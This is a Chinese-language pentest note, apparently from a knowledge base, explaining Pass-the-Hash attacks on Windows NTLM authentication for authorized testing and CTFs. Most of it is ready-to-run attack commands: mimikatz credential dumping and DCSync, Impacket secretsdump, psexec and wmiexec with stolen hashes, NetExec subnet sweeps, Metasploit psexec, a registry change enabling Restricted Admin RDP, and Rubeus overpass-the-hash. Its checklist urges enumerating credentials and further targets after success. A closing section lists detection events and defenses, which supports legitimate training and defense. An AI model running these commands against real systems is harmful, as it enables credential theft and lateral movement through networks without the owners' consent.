# 哈希传递（Pass-the-Hash）

> 适用场景：已经获得目标账户的 NTLM 哈希，但不知道明文密码，需要在允许 NTLM 认证的服务上复用该哈希完成远程认证。本文仅用于授权测试、靶场和比赛环境。
>
> 需要直接替换参数执行的完整流程见：[Pass-the-Hash 操作手册](Pass-the-Hash-操作手册.md)。
> 方法选型见：[各方法对比](Pass-the-Hash-各方法对比.md)　|　MSF 内操作见：[MSF 下的 PtH 操作](Pass-the-Hash-MSF操作.md)　|　纯命令版：[Pass-the-Hash-纯命令版](Pass-the-Hash-纯命令版.md)


## 1. 基本原理

Windows 本地账户和域账户的密码不会以明文保存在 SAM 或 NTDS 中，而是保存为密码哈希。NTLM 认证时，客户端并不需要把明文密码发送给服务端，而是使用密码哈希参与 challenge-response 计算。

Pass-the-Hash 的核心是：

```text
拿到 NT hash
→ 不破解明文密码
→ 直接使用 NT hash 构造 NTLM 认证
→ 通过 SMB / WMI / WinRM / RPC 等方式访问目标
```

它利用的是 NTLM 认证协议对“知道哈希”和“知道密码”无法强区分的问题。

## 2. 先区分几种 Hash

| 名称 | 说明 | 能否直接 PtH |
|---|---|---|
| LM hash | 旧版 LAN Manager 哈希，现代 Windows 默认不保存 | 通常不用于现代 PtH |
| NT hash | 通常所说的 NTLM hash，长度 32 位十六进制 | 可以 |
| NetNTLMv1 / v2 | 网络认证过程中捕获的 challenge-response | 不能直接当 NT hash 使用 |
| NTLMv2 response | 网络抓包得到的响应值 | 不能直接用于 `-hashes :<hash>` |
| AES key | Kerberos 使用的 AES 密钥 | 属于 Pass-the-Key，不是严格意义的 PtH |
| Kerberos 票据 | TGT / TGS | 属于 Pass-the-Ticket |

`Impacket` 的 `-hashes` 参数通常写成：

```text
LMHASH:NTHASH
```

如果只有 NT hash，常见写法是：

```bash
-hashes :<NTHASH>
```

冒号前留空表示没有 LM hash。

## 3. 使用条件

Pass-the-Hash 不是“拿到任意哈希就能登录所有机器”，通常需要同时满足：

1. 目标服务接受 NTLM 认证，目标没有禁用 NTLM。
2. 哈希对应的账户具有远程登录或远程管理权限。
3. 目标开放 SMB、WMI、WinRM、RPC、MSSQL 等可利用服务。
4. 防火墙允许访问相关端口。
5. 账户没有被限制为仅交互式登录。
6. 目标没有启用会阻止哈希复用的保护机制。

常见远程服务：

| 服务 | 端口 | 常见工具 |
|---|---|---|
| SMB | 445 | Impacket、NetExec、PsExec |
| WMI | 135 + 动态端口 | `wmiexec.py` |
| WinRM | 5985 / 5986 | NetExec、Evil-WinRM |
| RDP | 3389 | Restricted Admin 场景 |
| MSSQL | 1433 | NetExec、Impacket |
| RPC | 135 | `atexec.py`、计划任务 |

本地账户远程管理还会受到 UAC 远程限制影响。常见相关配置：

```text
LocalAccountTokenFilterPolicy
FilterAdministratorToken
RestrictAdmin
```

## 4. Hash 的常见来源

### 4.1 本机抓取

Windows：

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

Linux / 远程：

```bash
impacket-secretsdump administrator@target
impacket-secretsdump -hashes :<hash> administrator@target
```

### 4.2 域内获取

```text
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

其他来源：

- `NTDS.dit` 离线提取。
- 域控备份、快照或卷影副本。
- LSA Secrets。
- 高权限进程内存。
- 配置文件中保存的凭据材料。

## 5. Impacket

### 5.1 验证凭据

```bash
impacket-smbclient -hashes :<NTHASH> DOMAIN/user@target
```

### 5.2 执行单条命令

```bash
impacket-wmiexec -hashes :<NTHASH> DOMAIN/user@target 'whoami'
impacket-atexec -hashes :<NTHASH> DOMAIN/user@target 'whoami'
impacket-smbexec -hashes :<NTHASH> DOMAIN/user@target
```

### 5.3 交互式 Shell

```bash
impacket-psexec -hashes :<NTHASH> DOMAIN/user@target
impacket-wmiexec -hashes :<NTHASH> DOMAIN/user@target
```

### 5.4 认证方式选择

| 工具 | 特点 |
|---|---|
| `wmiexec` | 无文件、较隐蔽，适合单条命令 |
| `psexec` | 创建服务并上传程序，特征明显 |
| `smbexec` | 通过服务执行命令 |
| `atexec` | 通过计划任务执行 |
| `dcomexec` | 通过 DCOM 执行 |

## 6. NetExec / CrackMapExec

```bash
nxc smb target -u user -H <NTHASH>
nxc smb target -u user -H <NTHASH> --shares
nxc smb target -u user -H <NTHASH> -x 'whoami'
nxc winrm target -u user -H <NTHASH> -x 'whoami'
nxc mssql target -u user -H <NTHASH> -q 'SELECT @@version'
```

批量检测：

```bash
nxc smb 10.10.10.0/24 -u administrator -H <NTHASH>
```

NetExec 的结果中可使用 `Pwn3d!` 等标记判断是否具有管理员执行权限。

## 7. Mimikatz

在已经拿下 Windows 主机的情况下，可以注入哈希到当前会话：

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<NTHASH> /run:cmd.exe
```

新弹出的 `cmd.exe` 会携带对应认证材料。可以在该进程中执行：

```cmd
dir \\target\C$
net use \\target\C$ /user:domain\Administrator
```

## 8. Metasploit

```text
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser Administrator
set SMBDomain domain.local
set SMBPass <LMHASH>:<NTHASH>
run
```

如果只有 NT hash，常见设置是：

```text
set SMBPass :<NTHASH>
```

## 9. RDP 与 Restricted Admin

普通 RDP 通常需要明文密码。要使用哈希进行 RDP 登录，目标必须允许 Restricted Admin Mode，并且客户端支持 PtH：

```text
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

部分客户端可使用：

```bash
xfreerdp /u:Administrator /d:domain.local /pth:<NTHASH> /v:target
```

实际是否可用取决于 Windows 版本、RDP 客户端、Restricted Admin 配置和账户权限。

## 10. PtH、Overpass-the-Hash 与 Pass-the-Ticket

| 技术 | 使用的材料 | 目标 |
|---|---|---|
| Pass-the-Hash | NT hash | 通过 NTLM 访问远程服务 |
| Overpass-the-Hash | NT hash / AES key | 先申请 Kerberos TGT，再使用票据 |
| Pass-the-Key | AES / DES key | 使用 Kerberos 密钥申请票据 |
| Pass-the-Ticket | TGT / TGS | 直接导入和使用票据 |

Overpass-the-Hash 示例：

```text
Rubeus.exe asktgt /user:user /rc4:<NTHASH> /ptt
```

```bash
impacket-getTGT domain/user -hashes :<NTHASH>
export KRB5CCNAME=user.ccache
impacket-wmiexec domain/user@target -k -no-pass
```

如果目标禁用 NTLM、只允许 Kerberos，或者应用强制使用 Kerberos，PtH 可能失败，但 Overpass-the-Hash 仍可能成功。

## 11. 常见失败原因

- 把 NetNTLMv2 响应当成 NT hash。
- `-hashes` 格式错误，例如漏掉前面的冒号。
- 用户名或域写错，本地账户没有使用 `.\user` 或 `MACHINE\user`。
- 目标禁用 NTLM，只接受 Kerberos。
- 目标账户没有远程管理权限。
- 防火墙阻断 445、135、5985 等端口。
- 本地账户被 UAC 远程限制。
- RDP 没有开启 Restricted Admin。
- 目标启用了 Credential Guard、LAPS、Protected Users 等保护。
- 哈希已过期，例如账户改密、LAPS 轮换或 Kerberos key 轮换。

## 12. 检测与防御

### 12.1 日志线索

| 事件 | 关注点 |
|---|---|
| 4624 | 登录类型 3、NTLM 认证、异常源工作站 |
| 4625 | 大量失败登录 |
| 4648 | 显式凭据使用 |
| 4672 | 高权限登录 |
| 4776 | NTLM 凭据验证 |
| 4688 | 可疑进程创建 |
| 7045 | 服务安装，常见于 PsExec |

### 12.2 重点检测

- 同一账户从异常主机登录多个目标。
- 本地管理员账户在域内多台机器复用。
- 大量 SMB、WMI、WinRM 认证。
- `PSEXESVC`、`ADMIN$`、`C$`、命名管道等远程执行痕迹。
- 进程访问 `lsass.exe`。
- NTLM 认证流量异常增长。

### 12.3 防护措施

- 尽可能禁用 NTLM，统一使用 Kerberos。
- 启用 SMB Signing 和 EPA。SMB Signing 主要防止 NTLM 中继，不会阻止已经拿到有效哈希后的 PtH。
- 使用 LAPS 为每台机器生成独立本地管理员密码。
- 限制本地管理员账户和远程管理权限。
- 使用 Protected Users、Credential Guard 和分层管理模式。
- 监控 4624、4776、7045 等关键事件。
- 定期轮换高权限账户和机器账户密码。

## 13. 快速检查清单

```text
1. 确认拿到的是 NT hash，不是 NetNTLMv2。
2. 确认目标服务接受 NTLM。
3. 确认账户具备远程管理权限。
4. 先执行 whoami 验证认证。
5. 优先使用 wmiexec 做低噪声验证。
6. 失败时检查 UAC、Restricted Admin、NTLM 策略和防火墙。
7. 成功后立即枚举共享、凭据、日志和其他目标。
```

## 参考资料

- Microsoft NTLM 文档：<https://learn.microsoft.com/windows-server/security/windows-authentication/ntlm>
- Impacket：<https://github.com/fortra/impacket>
- NetExec：<https://github.com/Pennyw0rth/NetExec>
- Mimikatz：<https://github.com/gentilkiwi/mimikatz>
- MITRE ATT&CK T1550.002：<https://attack.mitre.org/techniques/T1550/002/>